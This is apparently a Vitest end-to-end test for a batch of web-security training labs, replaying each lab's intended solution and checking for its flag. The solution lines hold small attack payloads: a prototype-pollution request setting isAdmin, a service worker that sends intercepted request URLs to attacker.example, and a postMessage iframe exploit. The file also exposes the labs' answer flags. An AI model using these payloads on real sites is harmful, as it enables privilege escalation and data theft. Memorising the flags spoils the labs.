import { describe, it, expect } from 'vitest'
import fs from 'node:fs'
import path from 'node:path'
import { createSession } from './session'

// End-to-end solvability check for the WEB labs batch B7
// (web-csp-bypass, web-prototype-pollution, web-service-worker,
// web-postmessage-tabnabbing). Each entry loads the REAL fixture bundle, mirrors
// the lesson `lab:` block, replays the intended solution and asserts `check`.
const dir = path.resolve(process.cwd(), '../content/labs')
const WD = '/home/student/task'

function load(id) {
  return JSON.parse(fs.readFileSync(path.join(dir, `${id}.json`), 'utf8'))
}

const LABS = [
  {
    id: 'web-csp-bypass', flag: 'nto{js0np_g4dg3t_byp4ss3s_csp}', hints: 4,
    check: "grep -q 'nto{' found.txt",
    solution: [
      `curl -s -I https://forum.example/`,
      `curl -s https://cdn.jsdelivr.net/jsonp?callback=x > found.txt`,
    ],
  },
  {
    id: 'web-prototype-pollution', flag: 'nto{pr0t0typ3_p0llut10n_1s4dm1n}', hints: 4,
    check: "grep -q 'nto{' found.txt",
    solution: [
      `curl -s -X POST https://panel.example/api/settings -H 'Content-Type: application/json' -d '{"theme":"dark"}'`,
      `curl -s -X POST https://panel.example/api/settings -H 'Content-Type: application/json' -d '{"__proto__":{"isAdmin":true}}'`,
      `curl -s https://panel.example/admin -b 'session=user' > found.txt`,
    ],
  },
  {
    id: 'web-service-worker', flag: 'nto{s3rv1c3_w0rk3r_p3rs1st3nt_xss}', hints: 4,
    check: "grep -q 'addEventListener' evil-sw.js && grep -q 'nto{' found.txt",
    solution: [
      `echo 'self.addEventListener("fetch", e => { if (e.request.url.includes("/api/")) fetch("https://attacker.example/log?u="+e.request.url) })' > evil-sw.js`,
      `curl -s https://attacker.example/log > found.txt`,
    ],
  },
  {
    id: 'web-postmessage-tabnabbing', flag: 'nto{p0stm3ss4g3_n0_0r1g1n_ch3ck}', hints: 4,
    check: "grep -q 'postMessage' exploit.html && grep -q 'nto{' found.txt",
    solution: [
      `echo '<iframe id=f src="https://victim.com/widget"></iframe><script>f.onload=()=>f.contentWindow.postMessage("x","*")</script>' > exploit.html`,
      `curl -s 'https://evil.local/steal' > found.txt`,
    ],
  },
]

describe.each(LABS)('web lab B7: $id', ({ id, flag, hints, check, solution }) => {
  const bundle = load(id)
  const spec = { kind: 'shell', workdir: WD, check, hints: Array(hints).fill('h') }

  it('bundle + seed files are consistent with the lesson lab block', () => {
    expect(bundle.id).toBe(id)
    expect(bundle.workdir).toBe(WD)
    expect(bundle.fs.some((f) => f.path === `${WD}/task.md`)).toBe(true)
    expect(bundle.expect.file).toBe(`${WD}/found.txt`)
    expect(bundle.expect.contains).toBe(flag)
  })

  it('replays the intended solution and passes check', async () => {
    const s = createSession({ spec, bundle })
    expect((await s.run('check')).code).toBe(1)
    for (const cmd of solution) await s.run(cmd)
    expect((await s.run('check')).code).toBe(0)
  })
})
